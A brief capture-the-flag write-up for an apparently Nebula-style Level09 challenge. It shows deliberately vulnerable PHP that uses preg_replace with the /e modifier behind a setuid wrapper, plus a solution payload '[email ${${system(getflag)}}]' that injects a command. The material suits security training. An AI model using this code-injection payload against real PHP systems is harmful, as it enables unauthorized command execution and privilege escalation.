# Level09

#### About

There’s a C setuid wrapper for some vulnerable PHP code… 
To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09. 


#### Source Code

```
<?php

function spam($email)
{
	$email = preg_replace("/\./", " dot ", $email);
	$email = preg_replace("/@/", " AT ", $email);
	
	return $email;
}

function markup($filename, $use_me)
{
	$contents = file_get_contents($filename);

	$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
	$contents = preg_replace("/\[/", "<", $contents);
	$contents = preg_replace("/\]/", ">", $contents);

	return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```

#### Solutions

1. ----> test.txt 
[email ${${system(getflag)}}] 
  
2. /home/flag09/flag09 test.txt  


#### Recommends

Bash/Zsh/fish shell
